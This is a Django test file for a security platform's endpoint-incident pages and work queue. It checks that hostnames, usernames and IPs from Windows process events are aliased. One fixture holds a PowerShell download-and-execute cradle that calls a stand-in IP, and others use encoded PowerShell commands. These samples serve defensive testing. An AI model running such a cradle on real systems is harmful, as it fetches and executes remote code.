"""Part 5 -- Windows Endpoint Analyzer work-queue integration.

An escalated ``endpoint_activity`` incident carries no ``IncidentEvidence``
rows; its evidence is the linked ``EndpointCorrelationCandidate`` (the
deterministic ``trigger_summary``) and its ``EndpointEvent`` cluster. These
tests drive the *real* correlation + escalation path
(``apps.endpoints.services.triage_run.run_triage_scan`` with a fake AI
provider) and then assert what the incident detail page and the work queue
actually render -- including that real hostnames / usernames / IPs from the
event payloads never reach the page in the clear.
"""

from __future__ import annotations

import json
from datetime import timedelta

from django.utils import timezone

from config.testcase import AuthedTestCase
from apps.ai_core.models import AliasMapping
from apps.endpoints.models import Endpoint, EndpointEvent
from apps.endpoints.services.triage_run import run_triage_scan
from apps.incidents.models import IncidentGroup
from apps.incidents.views import _build_incident_identifier
from apps.organizations.models import Organization

BASE = timezone.now().replace(microsecond=0) - timedelta(hours=1)

_ESCALATE = json.dumps(
    {
        "verdict": "escalate",
        "severity": "high",
        "summary": "Encoded PowerShell pulled a remote payload.",
        "reasoning": "The 4688 command line uses -enc and fetches a remote script.",
    }
)


class _FakeProvider:
    model = "claude-sonnet-5-fake"

    def __init__(self, *responses):
        self._responses = list(responses)

    def send_message(self, prompt, **kwargs):
        return self._responses.pop(0) if self._responses else _ESCALATE


_rid = {"n": 0}


def _org():
    return Organization.objects.create(
        name="Pilot Org",
        organization_type="Demo",
        country="St. Vincent and the Grenadines",
        sector="Demo",
        risk_profile="medium",
    )


def _process_event(endpoint, *, at, command_line, user="j.reyes"):
    _rid["n"] += 1
    return EndpointEvent.objects.create(
        endpoint=endpoint,
        organization=endpoint.organization,
        event_type="Security/4688",
        occurred_at=at,
        payload={
            "computer": endpoint.display_name,
            "record_id": _rid["n"],
            "data": {
                "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "parent_process_name": r"C:\Windows\explorer.exe",
                "command_line": command_line,
                "subject_user_name": user,
            },
        },
    )


def _escalated_endpoint_incident(org, endpoint, command_line):
    _process_event(endpoint, at=BASE, command_line=command_line)
    report = run_triage_scan(provider=_FakeProvider(_ESCALATE))
    assert report.incidents_created, report.as_summary()
    return IncidentGroup.objects.get(id=report.incidents_created[0])


class EndpointActivityDetailTests(AuthedTestCase):
    def setUp(self):
        self.org = _org()
        self.endpoint, _ = Endpoint.issue(organization=self.org, display_name="WIN-PILOT-01")

    def _host_alias(self):
        return AliasMapping.objects.get(
            organization=self.org, identifier_type="HOST", real_value="WIN-PILOT-01"
        ).display_alias

    def test_detail_page_shows_trigger_summary_and_endpoint_identity(self):
        incident = _escalated_endpoint_incident(
            self.org, self.endpoint, "powershell -enc SQBFAFgA"
        )

        page = self.client.get(f"/incidents/{incident.id}/")
        self.assertEqual(page.status_code, 200)
        body = page.content.decode()

        # The deterministic trigger explanation (never AI-derived) is rendered.
        self.assertIn("suspicious_process_command_line", body)
        self.assertIn("Why this window was flagged", body)
        # Endpoint identity is shown, but aliased -- never the real name.
        self.assertIn(self._host_alias(), body)
        self.assertNotIn("WIN-PILOT-01", body)

    def test_command_line_identifiers_are_aliased(self):
        incident = _escalated_endpoint_incident(
            self.org,
            self.endpoint,
            "powershell -enc x ; IEX (New-Object Net.WebClient)"
            ".DownloadString('http://198.51.100.23/a.ps1')",
        )

        body = self.client.get(f"/incidents/{incident.id}/").content.decode()

        self.assertNotIn("198.51.100.23", body)
        ip_alias = AliasMapping.objects.get(
            organization=self.org, identifier_type="IP", real_value="198.51.100.23"
        ).display_alias
        self.assertIn(ip_alias, body)

    def test_username_is_aliased(self):
        incident = _escalated_endpoint_incident(
            self.org, self.endpoint, "powershell -enc SQBFAFgA"
        )

        body = self.client.get(f"/incidents/{incident.id}/").content.decode()

        self.assertNotIn("j.reyes", body)
        user_alias = AliasMapping.objects.get(
            organization=self.org, identifier_type="USER", real_value="j.reyes"
        ).display_alias
        self.assertIn(user_alias, body)

    def test_process_basename_is_shown_in_the_clear(self):
        incident = _escalated_endpoint_incident(
            self.org, self.endpoint, "powershell -enc SQBFAFgA"
        )
        body = self.client.get(f"/incidents/{incident.id}/").content.decode()
        # The LOLBin's identity is the signal, carries no identifier, and
        # matches trigger_summary's own convention -- shown, not aliased.
        self.assertIn("powershell.exe", body)
        # ...but never the full image path (it can embed a username).
        self.assertNotIn(r"C:\Windows\System32\WindowsPowerShell", body)

    def test_events_gone_shows_honest_state_not_a_fabricated_list(self):
        incident = _escalated_endpoint_incident(
            self.org, self.endpoint, "powershell -enc SQBFAFgA"
        )
        # Simulate the underlying events having been pruned after escalation.
        EndpointEvent.objects.filter(organization=self.org).delete()

        page = self.client.get(f"/incidents/{incident.id}/")
        self.assertEqual(page.status_code, 200)
        body = page.content.decode()
        # trigger_summary still there; an explicit "not retained" note, no
        # invented events.
        self.assertIn("suspicious_process_command_line", body)
        self.assertIn("no longer retained", body)

    def test_alert_based_incident_detail_is_unchanged(self):
        from apps.log_intake.models import ParsedAlert, UploadedLogFile
        from apps.incidents.models import IncidentEvidence

        uploaded = UploadedLogFile.objects.create(
            organization=self.org,
            file_name="f.json",
            source_type=UploadedLogFile.SourceType.WAZUH,
            storage_path="x/f.json",
            status=UploadedLogFile.Status.PARSED,
        )
        incident = IncidentGroup.objects.create(
            organization=self.org,
            title="Brute-force attempt",
            incident_type="Authentication Attack",
            severity=IncidentGroup.Severity.HIGH,
            status=IncidentGroup.Status.OPEN,
            affected_systems="EMAIL SERVER",
            summary="Brute-force activity detected.",
        )
        alert = ParsedAlert.objects.create(
            uploaded_file=uploaded,
            organization=self.org,
            source_tool="Entra ID",
            timestamp=timezone.now(),
            affected_system="EMAIL SERVER",
            event_type="Failed Login Events",
            severity_hint=ParsedAlert.SeverityHint.HIGH,
            raw_message="Repeated failed sign-ins.",
            normalized_summary="Repeated failed sign-ins from one IP.",
        )
        IncidentEvidence.objects.create(
            incident=incident, alert=alert, evidence_reason="Matched account and IP."
        )

        page = self.client.get(f"/incidents/{incident.id}/")
        self.assertEqual(page.status_code, 200)
        body = page.content.decode()
        self.assertIn("Failed Login Events", body)
        self.assertNotIn("Endpoint Activity", body)
        self.assertNotIn("Why this window was flagged", body)


class EndpointActivityWorkQueueTests(AuthedTestCase):
    def setUp(self):
        self.org = _org()
        self.endpoint, _ = Endpoint.issue(organization=self.org, display_name="WIN-PILOT-01")
        self.incident = _escalated_endpoint_incident(
            self.org, self.endpoint, "powershell -enc SQBFAFgA"
        )

    def _host_alias(self):
        return AliasMapping.objects.get(
            organization=self.org, identifier_type="HOST", real_value="WIN-PILOT-01"
        ).display_alias

    def test_queue_lists_endpoint_incident_like_an_alert_incident(self):
        queue = self.client.get("/incidents/?tab=queue")
        self.assertEqual(queue.status_code, 200)
        body = queue.content.decode()

        # The incident's own card is on the queue (its action/view links).
        self.assertIn(f"/incidents/{self.incident.id}/", body)
        # Severity pill, exactly as for an alert-based incident.
        self.assertIn(f"severity-pill--{self.incident.severity}", body)
        # Title rendered, hostname aliased, real value never in the clear.
        self.assertIn("endpoint activity on", body)
        self.assertIn(self._host_alias(), body)
        self.assertNotIn("WIN-PILOT-01", body)

    def test_assign_and_mine_filter_work_identically(self):
        identifier = _build_incident_identifier(self.incident)

        mine = self.client.get("/incidents/?tab=queue&assigned=me")
        self.assertEqual(mine.status_code, 200)
        self.assertNotContains(mine, identifier)  # not assigned to me yet

        resp = self.client.post(f"/incidents/{self.incident.id}/assign/")
        self.assertEqual(resp.status_code, 302)
        self.incident.refresh_from_db()
        self.assertIsNotNone(self.incident.assigned_to)

        mine = self.client.get("/incidents/?tab=queue&assigned=me")
        self.assertEqual(mine.status_code, 200)
        self.assertContains(mine, identifier)  # now in the "Mine" view
        self.assertNotContains(mine, "WIN-PILOT-01")
